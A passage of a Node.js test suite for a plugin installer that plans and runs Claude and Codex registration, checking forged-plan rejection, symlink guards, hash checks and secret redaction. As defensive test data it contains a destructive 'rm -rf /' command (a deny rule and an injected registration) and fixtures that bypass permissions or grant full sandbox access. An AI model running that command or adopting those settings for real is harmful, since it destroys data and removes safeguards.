import assert from "node:assert/strict";
import { existsSync } from "node:fs";
import { chmod, cp, mkdir, readdir, readFile, rename, rm, stat, symlink, writeFile } from "node:fs/promises";
import { basename, dirname, join, resolve, relative } from "node:path";
import test, { after } from "node:test";
import { fileURLToPath } from "node:url";

import { formatNativeRegistrationText, planNativeRegistration, runNativeRegistration, resolveNativeInstructionRoot } from "../../installers/lib/native-registration.mjs";
import { renderClaudeStatuslineCommand } from "../../adapters/claude/adapter.mjs";
import { hashBytes } from "../../installers/lib/hash.mjs";
import { canonicalTmpdir, makeTempRoot } from "../helpers/temp-root.mjs";
import { main } from "../../scripts/aaa.mjs";
import { skipIfLinkUnavailable } from "../helpers/symlink.mjs";

const GENERATED_TEMP_ROOTS = new Set();
const CORE_RULES_ROOT = resolve(dirname(fileURLToPath(import.meta.url)), "..", "..", "core", "rules");
// One package file per core rule plus the presentation catalog, rendered under
// the package-owned rules/all-about-agents/ folder that registration copies as is.
const CLAUDE_RULE_FILES = [
  ...(await readdir(CORE_RULES_ROOT, { withFileTypes: true })).filter((entry) => entry.isDirectory()).map((entry) => `${entry.name}.md`),
  "presentation.md"
].sort();
const CLAUDE_RULE_IDS = CLAUDE_RULE_FILES.map((name) => `claude-rule-${name.slice(0, -".md".length)}-deploy`);
// Shaped like the rendered files: top-level keys, then one table per role.
const CODEX_CONFIG = 'model = "gpt-5.6-sol"\nsandbox_mode = "danger-full-access"\n[agents.reviewer]\nconfig_file = "agents/reviewer.toml"\ndescription = "Reviews."\n\n[agents.verifier]\nconfig_file = "agents/verifier.toml"\ndescription = "Verifies."\n';
const GEMINI_BODY = "# Global Operating Rules\n\n## Routing contract\n\nRoute each task to one skill.\n";

async function generatedTempRoot(prefix) {
  const root = await makeTempRoot(prefix);
  GENERATED_TEMP_ROOTS.add(root);
  return root;
}

after(async () => {
  for (const root of [...GENERATED_TEMP_ROOTS]) {
    if (resolve(dirname(root)) !== await canonicalTmpdir() || !basename(root).startsWith("aaa-t06-")) throw new Error("refusing unsafe native-registration fixture cleanup");
    await rm(root, { recursive: true, force: true });
  }
});

// layout "parent" mirrors `install --surface all`: the Claude package is
// <root>/package/claude and its state sits one level up with a claude/ prefix.
async function fixture(profile = "template", { layout = "own" } = {}) {
  const root = await generatedTempRoot("aaa-t06-");
  const packageRoot = layout === "parent" ? join(root, "package", "claude") : join(root, "package");
  const productRoot = join(root, "product");
  await mkdir(packageRoot, { recursive: true });
  await mkdir(productRoot, { recursive: true });
  await mkdir(join(packageRoot, ".claude-plugin"));
  await mkdir(join(packageRoot, ".codex-plugin"));
  await mkdir(join(packageRoot, ".agents", "plugins"), { recursive: true });
  await mkdir(join(packageRoot, ".agents", "plugins", "all-about-agents"), { recursive: true });
  await mkdir(join(packageRoot, "all-about-agents"), { recursive: true });
  await mkdir(join(packageRoot, "agents"), { recursive: true });
  await mkdir(join(packageRoot, "statusline"), { recursive: true });
  await mkdir(join(packageRoot, "rules", "all-about-agents"), { recursive: true });
  for (const name of CLAUDE_RULE_FILES) await writeFile(join(packageRoot, "rules", "all-about-agents", name), `# ${name}\n`);
  await mkdir(join(packageRoot, "skills", "kept-skill"), { recursive: true });
  await writeFile(join(packageRoot, "skills", "kept-skill", "SKILL.md"), "# Kept skill\n");
  await mkdir(join(packageRoot, "hooks"), { recursive: true });
  await writeFile(join(packageRoot, "hooks", "activity-audit.mjs"), "// hook\n");
  await writeFile(join(packageRoot, ".claude-plugin", "plugin.json"), "{}\n");
  await writeFile(join(packageRoot, ".claude-plugin", "marketplace.json"), "{}\n");
  await writeFile(join(packageRoot, ".codex-plugin", "plugin.json"), "{}\n");
  await writeFile(join(packageRoot, ".agents", "plugins", "marketplace.json"), "{}\n");
  await writeFile(join(packageRoot, ".agents", "plugins", "all-about-agents", "plugin.json"), "{}\n");
  await writeFile(join(packageRoot, "settings.json"), '{"permissions":{"defaultMode":"bypassPermissions","deny":["Bash(rm -rf /)"]},"statusLine":{"type":"command","command":"stale-package-root-command"}}\n');
  await writeFile(join(packageRoot, "CLAUDE.md"), "# Global instructions\n");
  await writeFile(join(packageRoot, "all-about-agents", "statusline.json"), '{"schemaVersion":1,"displayName":"Test"}\n');
  await writeFile(join(packageRoot, "statusline", "statusline.mjs"), "// renderer\n");
  await writeFile(join(packageRoot, "statusline", "track-tool.mjs"), "// tracker\n");
  await writeFile(join(packageRoot, "statusline", "statusline.ps1"), "# windows launcher\n");
  await writeFile(join(packageRoot, "statusline", "statusline.sh"), "#!/bin/sh\n# posix launcher\n");
  await writeFile(join(packageRoot, "AGENTS.md"), "# Global instructions\n");
  await writeFile(join(packageRoot, "config.toml"), CODEX_CONFIG);
  await writeFile(join(packageRoot, "terra-max.config.toml"), 'model = "gpt-5.6-terra"\n');
  for (const role of ["architect", "implementer", "investigator", "researcher", "reviewer", "security-reviewer", "verifier"]) {
    await writeFile(join(packageRoot, "agents", `${role}.toml`), `developer_instructions = "${role}"\n`);
    await writeFile(join(packageRoot, "agents", `${role}.md`), `# ${role}\n`);
  }
  await writeFile(join(packageRoot, "plugin.json"), "{}\n");
  await writeFile(join(packageRoot, "GEMINI.md"), GEMINI_BODY);
  const prefix = layout === "parent" ? "claude/" : "";
  const ownedPaths = (await treeBytes(packageRoot)).map(([relativePath, content]) => ({
    relativePath: `${prefix}${relativePath.replaceAll("\\", "/")}`,
    sha256: hashBytes(Buffer.from(content, "base64"))
  })).sort((left, right) => left.relativePath === right.relativePath ? 0 : left.relativePath < right.relativePath ? -1 : 1);
  // Hooks append runtime logs beside themselves; they are never owned.
  await mkdir(join(packageRoot, "hooks", "audit"), { recursive: true });
  await writeFile(join(packageRoot, "hooks", "audit", "activity-audit.log"), "runtime event\n");
  const stateRoot = layout === "parent" ? dirname(packageRoot) : packageRoot;
  await mkdir(join(stateRoot, ".all-about-agents"), { recursive: true });
  await writeFile(join(stateRoot, ".all-about-agents", "state.json"), `${JSON.stringify({
    schemaVersion: 1,
    repositoryVersion: "test-repository",
    profile,
    surfaces: ["antigravity", "claude", "codex"],
    ownedPaths
  })}\n`);
  return { root, packageRoot, productRoot };
}

async function treeBytes(root) {
  const { readdir } = await import("node:fs/promises");
  const result = [];
  async function visit(current) {
    for (const entry of await readdir(current, { withFileTypes: true })) {
      const path = join(current, entry.name);
      if (entry.isDirectory()) await visit(path);
      else result.push([relative(root, path), (await readFile(path)).toString("base64")]);
    }
  }
  await visit(root);
  return result.sort((left, right) => left[0].localeCompare(right[0]));
}

const PLUGIN_SELECTOR = "all-about-agents@all-about-agents";
const CLAUDE_REINSTALL = [
  `claude plugin uninstall ${PLUGIN_SELECTOR} --scope user --keep-data`,
  `claude plugin install ${PLUGIN_SELECTOR} --scope user`
];

function claudeCacheRoot(input) {
  return join(input.productRoot, "plugins", "cache", "all-about-agents", "all-about-agents", "2.1.1");
}

// Fake product CLIs. Like the real product, a Claude install copies the package
// into a version-keyed cache only when that cache does not exist yet.
function fakeProducts(input, { gitPrefix = "", gitStatus = "", listing } = {}) {
  const cacheRoot = claudeCacheRoot(input);
  const calls = [];
  const run = async (request) => {
    calls.push(request);
    const [, command] = request.args;
    if (request.executable === "git" && request.args.includes("rev-parse")) {
      return gitPrefix === null ? { exitCode: 128, stdout: "", stderr: "fatal: not a git repository" } : { exitCode: 0, stdout: `${gitPrefix}\n`, stderr: "" };
    }
    if (request.executable === "git") return { exitCode: 0, stdout: gitStatus, stderr: "" };
    if (request.executable === "claude" && command === "install" && !existsSync(cacheRoot)) await cp(input.packageRoot, cacheRoot, { recursive: true });
    if (request.executable === "claude" && command === "list") {
      return { exitCode: 0, stdout: JSON.stringify(listing ?? [{ id: PLUGIN_SELECTOR, version: "2.1.1", scope: "user", enabled: true, installPath: cacheRoot }]), stderr: "" };
    }
    return { exitCode: 0, stdout: "{}", stderr: "" };
  };
  return { run, calls };
}

function base(input, surface) {
  return planNativeRegistration({
    surface,
    packageRoot: input.packageRoot,
    productRoot: input.productRoot,
    instructionRoot: input.productRoot,
    profile: "template",
    platform: process.platform,
    rendered: { files: [], registrations: [{ executable: "rm", args: ["-rf", "/"] }] }
  });
}

test("planner creates deterministic known actions for every surface", async () => {
  const input = await fixture();
  const expected = {
    claude: ["claude-instructions-deploy", "claude-settings-deploy", "claude-statusline-config-deploy", "claude-statusline-renderer-deploy", "claude-statusline-tracker-deploy", "claude-statusline-windows-launcher-deploy", "claude-statusline-posix-launcher-deploy", ...CLAUDE_RULE_IDS, "claude-marketplace-add", "claude-plugin-install", "claude-plugin-list", "claude-plugin-cache-check", "claude-reload"],
    codex: ["codex-instructions-deploy", "codex-config-deploy", "codex-terra-profile-deploy", "codex-agent-architect-deploy", "codex-agent-implementer-deploy", "codex-agent-investigator-deploy", "codex-agent-researcher-deploy", "codex-agent-reviewer-deploy", "codex-agent-security-reviewer-deploy", "codex-agent-verifier-deploy", "codex-marketplace-add", "codex-plugin-install", "codex-plugin-list", "codex-plugin-source-check", "codex-hooks-trust"]
  };
  for (const [surface, ids] of Object.entries(expected)) {
    const plan = base(input, surface);
    assert.deepEqual(plan.actions.map((action) => action.id), ids);
    assert.equal(plan.schemaVersion, 1);
    assert.equal(plan.surface, surface);
    assert.equal(plan.lifecycle.registered.status, "not-run");
    assert.match(plan.lifecycle.rendered.evidence, /required marker regular files/iu);
  }
});

test("planner records Claude trust as unavailable because no native trust step exists", async () => {
  const input = await fixture();
  const claude = base(input, "claude");
  assert.equal(claude.lifecycle.trusted.status, "not-run-unavailable");
  assert.match(claude.lifecycle.trusted.evidence, /no separate native trust step/iu);
  for (const surface of ["codex"]) {
    assert.equal(base(input, surface).lifecycle.trusted.status, "not-run");
  }
});

test("planner returns an authentic deeply frozen execution plan", async () => {
  const input = await fixture();
  const plan = base(input, "codex");
  assert.ok(Object.isFrozen(plan));
  assert.ok(Object.isFrozen(plan.actions));
  assert.ok(Object.isFrozen(plan.actions[0]));
  const processAction = plan.actions.find((action) => action.kind === "process");
  assert.ok(Object.isFrozen(processAction.args));
  assert.ok(Object.isFrozen(processAction.environmentKeys));
  assert.ok(Object.isFrozen(plan.lifecycle));
  assert.ok(Object.isFrozen(plan.lifecycle.registered));
  assert.throws(() => processAction.args.push("forged"), TypeError);
  assert.throws(() => { plan.lifecycle.registered.status = "pass"; }, TypeError);
  assert.equal(processAction.args.at(-1), "--json");
  assert.equal(plan.lifecycle.registered.status, "not-run");
});

test("executor rejects forged plans without invoking an arbitrary executable", async () => {
  const input = await fixture();
  const marker = join(input.root, "forged-executed.txt");
  const forged = {
    schemaVersion: 1,
    surface: "codex",
    profile: "template",
    packageRoot: input.packageRoot,
    productRoot: input.productRoot,
    actions: [{
      id: "forged-process",
      kind: "process",
      executable: process.execPath,
      args: ["-e", `require("node:fs").writeFileSync(${JSON.stringify(marker)}, "bad")`],
      cwd: input.packageRoot,
      environmentKeys: [],
      expectedProbe: "none",
      required: true,
      mutates: true
    }],
    lifecycle: {}
  };
  let calls = 0;
  await assert.rejects(
    () => runNativeRegistration(forged, { mode: "apply", runProcess: async () => { calls += 1; } }),
    (error) => error.code === "untrusted-plan"
  );
  assert.equal(calls, 0);
  await assert.rejects(() => readFile(marker));
});

test("planner emits exact structured argv and ignores rendered executable metadata", async () => {
  const input = await fixture();
  const codex = base(input, "codex");
  assert.deepEqual(codex.actions.filter((action) => action.kind === "process").map(({ executable, args, cwd, environmentKeys }) => ({ executable, args, cwd, environmentKeys })), [
    { executable: "codex", args: ["plugin", "marketplace", "add", input.packageRoot, "--json"], cwd: input.packageRoot, environmentKeys: ["CODEX_HOME"] },
    { executable: "codex", args: ["plugin", "add", "all-about-agents@all-about-agents", "--json"], cwd: input.packageRoot, environmentKeys: ["CODEX_HOME"] },
    { executable: "codex", args: ["plugin", "list", "--available", "--json"], cwd: input.packageRoot, environmentKeys: ["CODEX_HOME"] }
  ]);
  assert.equal(codex.actions.some((action) => action.executable === "rm"), false);
  const claude = base(input, "claude");
  assert.deepEqual(claude.actions.filter((action) => action.kind === "process").map((action) => action.args), [
    ["plugin", "marketplace", "add", input.packageRoot, "--scope", "user"],
    ["plugin", "install", "all-about-agents@all-about-agents", "--scope", "user"],
    ["plugin", "list", "--json"]
  ]);
});

test("shared product config is merged or refused, never clobbered", async () => {
  const input = await fixture();
  const settings = base(input, "claude").actions.find((action) => action.id === "claude-settings-deploy");
  assert.equal(settings.kind, "settings-overlay");
  assert.equal(settings.targetPath, resolve(input.productRoot, "settings.json"));
  assert.equal(settings.overlayPath, resolve(input.packageRoot, "settings.json"));
  assert.equal(settings.transform, "claude-statusline-product-root");
  assert.equal(settings.automaticWrite, true);

  const config = base(input, "codex").actions.find((action) => action.id === "codex-config-deploy");
  assert.equal(config.kind, "file-copy");
  assert.equal(config.guard, "no-clobber");
});

test("native instruction roots map to the documented surface roots", async () => {
  const home = process.platform === "win32" ? "C:\\Users\\fixture" : "/Users/fixture";
  assert.equal(resolveNativeInstructionRoot("claude", { env: {}, homeDir: home, platform: process.platform }), process.platform === "win32" ? "C:\\Users\\fixture\\.claude" : "/Users/fixture/.claude");
  assert.equal(resolveNativeInstructionRoot("codex", { env: {}, homeDir: home, platform: process.platform }), process.platform === "win32" ? "C:\\Users\\fixture\\.codex" : "/Users/fixture/.codex");
});

test("planner deploys the Claude and Codex runtime config needed by the installed package", async () => {
  const input = await fixture();
  const claudeCopies = base(input, "claude").actions.filter((action) => action.kind === "file-copy");
  assert.deepEqual(claudeCopies.map(({ sourcePath, targetPath, mode, transform }) => [relative(input.packageRoot, sourcePath), relative(input.productRoot, targetPath), mode, transform ?? null]), [
    ["CLAUDE.md", "CLAUDE.md", null, null],
    [join("all-about-agents", "statusline.json"), join("all-about-agents", "statusline.json"), null, null],
    [join("statusline", "statusline.mjs"), join("statusline", "statusline.mjs"), 0o755, null],
    [join("statusline", "track-tool.mjs"), join("statusline", "track-tool.mjs"), 0o755, null],
    [join("statusline", "statusline.ps1"), join("statusline", "statusline.ps1"), null, null],
    [join("statusline", "statusline.sh"), join("statusline", "statusline.sh"), 0o755, null],
    ...CLAUDE_RULE_FILES.map((name) => [join("rules", "all-about-agents", name), join("rules", "all-about-agents", name), null, null])
  ]);
  assert.deepEqual([...new Set(claudeCopies.filter((action) => action.id.startsWith("claude-rule-")).map((action) => action.guard))], [null]);
  const codexCopies = base(input, "codex").actions.filter((action) => action.kind === "file-copy");
  assert.deepEqual(codexCopies.slice(0, 3).map(({ sourcePath, targetPath }) => [relative(input.packageRoot, sourcePath), relative(input.productRoot, targetPath)]), [
    ["AGENTS.md", "AGENTS.md"],
    ["config.toml", "config.toml"],
    ["terra-max.config.toml", "terra-max.config.toml"]
  ]);
  assert.equal(codexCopies.filter((action) => /codex-agent-.+-deploy/u.test(action.id)).length, 7);
});

test("planner rejects unsupported surfaces, profiles, unsafe roots, and symlink roots", async (t) => {
  const input = await fixture();
  assert.throws(() => planNativeRegistration({ ...input, surface: "unknown", profile: "template" }), (error) => error.code === "unsupported-surface");
  assert.throws(() => planNativeRegistration({ ...input, surface: "codex", profile: "unknown" }), (error) => error.code === "invalid-profile");
  const traversal = `${input.packageRoot}${process.platform === "win32" ? "\\" : "/"}..`;
  assert.throws(() => planNativeRegistration({ ...input, surface: "codex", packageRoot: traversal, profile: "template" }), (error) => error.code === "root-traversal");
  assert.throws(() => planNativeRegistration({ ...input, surface: "codex", packageRoot: "relative-package", profile: "template" }), (error) => error.code === "invalid-root");
  assert.throws(() => planNativeRegistration({ ...input, surface: "codex", productRoot: `${input.productRoot}${process.platform === "win32" ? "\\" : "/"}..`, profile: "template" }), (error) => error.code === "root-traversal");
  const outside = await generatedTempRoot("aaa-t06-outside-");
  const link = join(input.root, "package-link");
  try {
    await symlink(outside, link, process.platform === "win32" ? "junction" : "dir");
  } catch (error) {
    skipIfLinkUnavailable(t, error);
    return;
  }
  assert.throws(() => planNativeRegistration({ ...input, surface: "codex", packageRoot: link, profile: "template" }), /symlink|unsafe|root/u);
});

test("planner binds registration to managed surface, profile, and owned hashes", async () => {
  const template = await fixture("template");
  assert.throws(
    () => planNativeRegistration({ surface: "claude", packageRoot: template.packageRoot, productRoot: template.productRoot, profile: "portable" }),
    (error) => error.code === "package-profile-mismatch"
  );
  const portable = await fixture("portable");
  assert.throws(
    () => planNativeRegistration({ surface: "codex", packageRoot: portable.packageRoot, productRoot: portable.productRoot, profile: "template" }),
    (error) => error.code === "package-profile-mismatch"
  );
  await writeFile(join(template.packageRoot, "settings.json"), '{"tampered":true}\n');
  assert.throws(
    () => planNativeRegistration({ surface: "claude", packageRoot: template.packageRoot, productRoot: template.productRoot, profile: "template" }),
    (error) => error.code === "package-owned-hash-mismatch"
  );
  await rm(join(portable.packageRoot, ".all-about-agents", "state.json"));
  assert.throws(
    () => planNativeRegistration({ surface: "codex", packageRoot: portable.packageRoot, productRoot: portable.productRoot, profile: "portable" }),
    (error) => error.code === "package-state-missing"
  );
});

test("planning errors keep local absolute paths out of diagnostics", async () => {
  const input = await fixture();
  const missingPackage = join(input.root, "missing-package");
  assert.throws(
    () => planNativeRegistration({ ...input, surface: "codex", packageRoot: missingPackage, profile: "template" }),
    (error) => error.code === "invalid-root" && !error.message.includes(missingPackage)
  );
});

test("apply stops at the first required process failure and reports a partial result", async () => {
  const input = await fixture();
  const plan = base(input, "codex");
  const calls = [];
  const report = await runNativeRegistration(plan, {
    mode: "apply",
    runProcess: async (request) => {
      calls.push(request);
      return { exitCode: calls.length === 1 ? 0 : 23, stdout: "{}", stderr: "native failure" };
    }
  });
  assert.equal(report.status, "partial");
  assert.equal(report.completed.length, 11);
  assert.equal(report.failed.action.id, "codex-plugin-install");
  assert.deepEqual(report.notAttempted.map((action) => action.id), ["codex-plugin-list", "codex-plugin-source-check", "codex-hooks-trust"]);
  assert.deepEqual(calls[0].args, ["plugin", "marketplace", "add", input.packageRoot, "--json"]);
  assert.deepEqual(calls[0].environmentKeys, ["CODEX_HOME"]);
  assert.equal(calls[0].env.CODEX_HOME, input.productRoot);
  assert.equal(calls[0].shell, false);
  assert.equal(report.lifecycle.registered.status, "fail");
});

test("Codex product commands get the product root without inherited GIT_* redirects", async () => {
  const input = await fixture();
  const previous = { GIT_DIR: process.env.GIT_DIR, GIT_INDEX_FILE: process.env.GIT_INDEX_FILE };
  process.env.GIT_DIR = join(input.root, "hook.git");
  process.env.GIT_INDEX_FILE = join(input.root, "hook.index");
  try {
    const products = fakeProducts(input);
    await runNativeRegistration(base(input, "codex"), { mode: "apply", runProcess: products.run });
    const codexCalls = products.calls.filter((request) => request.executable === "codex");
    assert.equal(codexCalls.length, 3);
    for (const request of codexCalls) {
      assert.equal(request.envOverrides, undefined);
      assert.equal(request.env.CODEX_HOME, input.productRoot);
      assert.deepEqual(Object.keys(request.env).filter((key) => /^GIT_/iu.test(key)), []);
    }
  } finally {
    for (const [key, value] of Object.entries(previous)) {
      if (value === undefined) delete process.env[key];
      else process.env[key] = value;
    }
  }
});

test("successful native commands remain registered not-run until semantic discovery is observed", async () => {
  const input = await fixture();
  const report = await runNativeRegistration(base(input, "codex"), { mode: "apply", runProcess: fakeProducts(input).run });
  assert.equal(report.status, "complete");
  assert.equal(report.lifecycle.validated.status, "not-run");
  assert.equal(report.lifecycle.registered.status, "not-run");
  assert.match(report.lifecycle.registered.evidence, /semantic|discovery|observed/iu);
});

test("successful reports keep manual actions out of completed execution", async () => {
  const input = await fixture();
  const cases = [
    ["codex", ["codex-instructions-deploy", "codex-config-deploy", "codex-terra-profile-deploy", "codex-agent-architect-deploy", "codex-agent-implementer-deploy", "codex-agent-investigator-deploy", "codex-agent-researcher-deploy", "codex-agent-reviewer-deploy", "codex-agent-security-reviewer-deploy", "codex-agent-verifier-deploy", "codex-marketplace-add", "codex-plugin-install", "codex-plugin-list", "codex-plugin-source-check"]],
    ["claude", ["claude-instructions-deploy", "claude-settings-deploy", "claude-statusline-config-deploy", "claude-statusline-renderer-deploy", "claude-statusline-tracker-deploy", "claude-statusline-windows-launcher-deploy", "claude-statusline-posix-launcher-deploy", ...CLAUDE_RULE_IDS, "claude-marketplace-add", "claude-plugin-install", "claude-plugin-list", "claude-plugin-cache-check"]]
  ];
  for (const [surface, executedIds] of cases) {
    const report = await runNativeRegistration(base(input, surface), { mode: "apply", runProcess: fakeProducts(input).run });
    assert.equal(report.status, "complete");
    assert.deepEqual(report.completed.map((action) => action.id), executedIds);
    assert.equal(report.actions.at(-1).status, "manual-required");
    assert.equal(report.completed.some((action) => action.kind === "manual"), false);
  }
});

test("apply revalidates roots and marker ancestors after planning", async (t) => {
  const input = await fixture();
  const packagePlan = base(input, "codex");
  const outside = await generatedTempRoot("aaa-t06-revalidation-");
  const markerDir = join(input.packageRoot, ".codex-plugin");
  const markerDirMoved = join(input.root, ".codex-plugin-original");
  await rename(markerDir, markerDirMoved);
  try {
    await symlink(outside, markerDir, process.platform === "win32" ? "junction" : "dir");
  } catch (error) {
    skipIfLinkUnavailable(t, error);
    return;
  }
  let calls = 0;
  const report = await runNativeRegistration(packagePlan, { mode: "apply", runProcess: async () => { calls += 1; return { exitCode: 0, stdout: "{}" }; } });
  assert.equal(calls, 0);
  assert.equal(report.status, "failed");
  assert.match(report.error.code, /unsafe|symlink|package/u);
});

test("apply rejects a later copy source changed after the initial package scan", async () => {
  const input = await fixture();
  const plan = base(input, "claude");
  const firstSource = join(input.packageRoot, "settings.json");
  const laterSource = join(input.packageRoot, "all-about-agents", "statusline.json");
  let mutated = false;
  let processCalls = 0;
  const report = await runNativeRegistration(plan, {
    mode: "apply",
    runProcess: async () => { processCalls += 1; return { exitCode: 0, stdout: "{}", stderr: "" }; },
    fileSystem: {
      async readFile(path) {
        const content = await readFile(path);
        if (path === firstSource && !mutated) {
          mutated = true;
          await writeFile(laterSource, '{"tampered":true}\n');
        }
        return content;
      }
    }
  });
  assert.equal(report.status, "partial");
  assert.equal(report.failed.action.id, "claude-statusline-config-deploy");
  assert.equal(report.error.code, "package-owned-hash-mismatch");
  assert.equal(processCalls, 0);
  await assert.rejects(() => readFile(join(input.productRoot, "all-about-agents", "statusline.json")));
});

test("apply revalidates non-copy package files before the first native process", async () => {
  const input = await fixture();
  const plan = base(input, "claude");
  const firstSource = join(input.packageRoot, "settings.json");
  const pluginMarker = join(input.packageRoot, ".claude-plugin", "plugin.json");
  let mutated = false;
  let processCalls = 0;
  const report = await runNativeRegistration(plan, {
    mode: "apply",
    runProcess: async () => { processCalls += 1; return { exitCode: 0, stdout: "{}", stderr: "" }; },
    fileSystem: {
      async readFile(path) {
        const content = await readFile(path);
        if (path === firstSource && !mutated) {
          mutated = true;
          await writeFile(pluginMarker, '{"tampered":true}\n');
        }
        return content;
      }
    }
  });
  assert.equal(report.status, "partial");
  assert.equal(report.failed.action.id, "claude-marketplace-add");
  assert.equal(report.error.code, "package-owned-hash-mismatch");
  assert.equal(processCalls, 0);
});

test("apply rejects a product root junction created after planning", async (t) => {
  const input = await fixture();
  const plan = base(input, "codex");
  const outside = await generatedTempRoot("aaa-t06-product-outside-");
  const moved = join(input.root, "product-original");
  await rename(input.productRoot, moved);
  try {
    await symlink(outside, input.productRoot, process.platform === "win32" ? "junction" : "dir");
  } catch (error) {
    skipIfLinkUnavailable(t, error);
    return;
  }
  let calls = 0;
  const report = await runNativeRegistration(plan, { mode: "apply", runProcess: async () => { calls += 1; return { exitCode: 0, stdout: "{}" }; } });
  assert.equal(calls, 0);
  assert.equal(report.status, "failed");
  assert.match(report.error.code, /unsafe|root/u);
});

test("registration reports retain argv structure without leaking local roots", async () => {
  const input = await fixture();
  const report = await runNativeRegistration(base(input, "codex"), { mode: "dry-run" });
  const serialized = JSON.stringify(report);
  assert.equal(serialized.includes(input.packageRoot), false);
  assert.equal(serialized.includes(input.productRoot), false);
  const marketplace = report.actions.find((action) => action.id === "codex-marketplace-add");
  assert.equal(marketplace.args.length, 5);
  assert.equal(marketplace.args[3], "<PACKAGE_ROOT>");
  assert.equal(report.packageRoot, "<PACKAGE_ROOT>");
  assert.equal(report.productRoot, "<PRODUCT_ROOT>");
});

test("native execution keeps ambient secrets out of requests and reports", async () => {
  const input = await fixture();
  const key = "T06_HOSTILE_AMBIENT_SECRET";
  const secret = "t06-secret-must-not-escape";
  const previous = process.env[key];
  process.env[key] = secret;
  try {
    const requests = [];
    const products = fakeProducts(input);
    const report = await runNativeRegistration(base(input, "claude"), {
      mode: "apply",
      runProcess: async (request) => {
        requests.push(request);
        return { ...(await products.run(request)), stderr: secret };
      }
    });
    assert.equal(report.status, "complete");
    assert.equal(JSON.stringify(requests).includes(secret), false);
    assert.equal(JSON.stringify(report).includes(secret), false);
    assert.equal(requests[0].env, undefined);
    assert.deepEqual(Object.keys(requests[0].envOverrides), ["CLAUDE_CONFIG_DIR"]);
  } finally {
    if (previous === undefined) delete process.env[key];
    else process.env[key] = previous;
  }
});

test("native reports redact Windows path case and separator variants", async () => {
  const input = await fixture();
  const variants = [input.packageRoot, input.productRoot, process.env.USERPROFILE]
    .filter((value) => typeof value === "string" && value.length > 0)
    .map((value) => process.platform === "win32" ? value.replaceAll("\\", "/").toUpperCase() : value);
  const report = await runNativeRegistration(base(input, "claude"), {
    mode: "apply",
    runProcess: async () => { throw new Error(`injected paths: ${variants.join(" | ")}`); }
  });
  const serialized = JSON.stringify(report);
  for (const variant of variants) assert.equal(serialized.includes(variant), false);
  assert.match(serialized, /<PACKAGE_ROOT>|<PRODUCT_ROOT>|<HOME>/u);
});

test("apply reports unavailable and malformed probe output without leaking stdout", async () => {
  const input = await fixture();
  const unavailable = await runNativeRegistration(base(input, "claude"), { mode: "apply", runProcess: async () => ({ unavailable: true, exitCode: null, stdout: "leaked-stdout-sentinel", stderr: "ENOENT" }) });
  assert.equal(unavailable.status, "partial");
  assert.equal(unavailable.error.code, "native-executable-unavailable");
  assert.doesNotMatch(JSON.stringify(unavailable), /leaked-stdout-sentinel/u);
  const malformed = await runNativeRegistration(base(input, "codex"), { mode: "apply", runProcess: async () => ({ exitCode: 0, stdout: "not-json", stderr: "" }) });
  assert.equal(malformed.status, "partial");
  assert.equal(malformed.failed.action.id, "codex-marketplace-add");
  assert.match(malformed.failed.reason, /JSON/u);
  const empty = await runNativeRegistration(base(input, "codex"), { mode: "apply", runProcess: async () => ({ exitCode: 0, stdout: "", stderr: "" }) });
  assert.equal(empty.failed.error.code, "malformed-native-json");
});

test("apply stops on a timed-out native process and does not run later actions", async () => {
  const input = await fixture();
  const calls = [];
  const report = await runNativeRegistration(base(input, "codex"), { mode: "apply", runProcess: async (request) => { calls.push(request); return { timedOut: true, exitCode: null, stdout: "", stderr: "" }; } });
  assert.equal(report.status, "partial");
  assert.equal(report.failed.error.code, "native-process-timeout");
  assert.equal(calls.length, 1);
  assert.deepEqual(report.notAttempted.map((action) => action.id), ["codex-plugin-install", "codex-plugin-list", "codex-plugin-source-check", "codex-hooks-trust"]);
});

test("apply atomically overwrites approved Claude and Codex config destinations", async () => {
  const input = await fixture();
  await writeFile(join(input.productRoot, "CLAUDE.md"), "old instructions\n");
  await writeFile(join(input.productRoot, "settings.json"), '{"old":true}\n');
  const claude = await runNativeRegistration(base(input, "claude"), { mode: "apply", runProcess: fakeProducts(input).run });
  assert.equal(claude.status, "complete");
  assert.equal(await readFile(join(input.productRoot, "CLAUDE.md"), "utf8"), "# Global instructions\n");
  const productEntries = await (await import("node:fs/promises")).readdir(input.productRoot);
  assert.equal(productEntries.some((entry) => entry.includes("backup")), false);
  const installedClaudeSettings = JSON.parse(await readFile(join(input.productRoot, "settings.json"), "utf8"));
  assert.deepEqual(installedClaudeSettings.permissions, { defaultMode: "bypassPermissions", deny: ["Bash(rm -rf /)"] });
  assert.equal(installedClaudeSettings.statusLine.command, renderClaudeStatuslineCommand({ configRoot: input.productRoot, platform: process.platform }));
  assert.notEqual(installedClaudeSettings.statusLine.command, "stale-package-root-command");
  assert.equal(await readFile(join(input.productRoot, "all-about-agents", "statusline.json"), "utf8"), '{"schemaVersion":1,"displayName":"Test"}\n');
  assert.equal(await readFile(join(input.productRoot, "statusline", "statusline.mjs"), "utf8"), "// renderer\n");
  assert.equal(await readFile(join(input.productRoot, "statusline", "track-tool.mjs"), "utf8"), "// tracker\n");
  assert.equal(await readFile(join(input.productRoot, "statusline", "statusline.ps1"), "utf8"), "# windows launcher\n");
  assert.equal(await readFile(join(input.productRoot, "statusline", "statusline.sh"), "utf8"), "#!/bin/sh\n# posix launcher\n");

  const codex = await runNativeRegistration(base(input, "codex"), { mode: "apply", runProcess: fakeProducts(input).run });
  assert.equal(codex.status, "complete");
  assert.equal(await readFile(join(input.productRoot, "config.toml"), "utf8"), CODEX_CONFIG);
  assert.equal(await readFile(join(input.productRoot, "terra-max.config.toml"), "utf8"), 'model = "gpt-5.6-terra"\n');
  assert.equal(await readFile(join(input.productRoot, "agents", "reviewer.toml"), "utf8"), 'developer_instructions = "reviewer"\n');
});

test("a linked Claude rules folder degrades to one manual step instead of blocking registration", async (t) => {
  for (const linkedPath of [["rules"], ["rules", "all-about-agents"]]) {
    const input = await fixture();
    const outside = await generatedTempRoot("aaa-t06-rules-outside-");
    await mkdir(join(input.productRoot, ...linkedPath.slice(0, -1)), { recursive: true });
    try {
      await symlink(outside, join(input.productRoot, ...linkedPath), process.platform === "win32" ? "junction" : "dir");
    } catch (error) {
      skipIfLinkUnavailable(t, error);
      return;
    }
    const plan = base(input, "claude");
    assert.equal(plan.actions.some((action) => action.id.startsWith("claude-rule-")), false);
    const manual = plan.actions.filter((action) => action.id === "claude-rules-deploy");
    assert.equal(manual.length, 1);
    assert.equal(manual[0].kind, "manual");
    assert.match(manual[0].message, /<CLAUDE_CONFIG_DIR>\/rules\/all-about-agents/u);
    const dry = await runNativeRegistration(plan, { mode: "dry-run" });
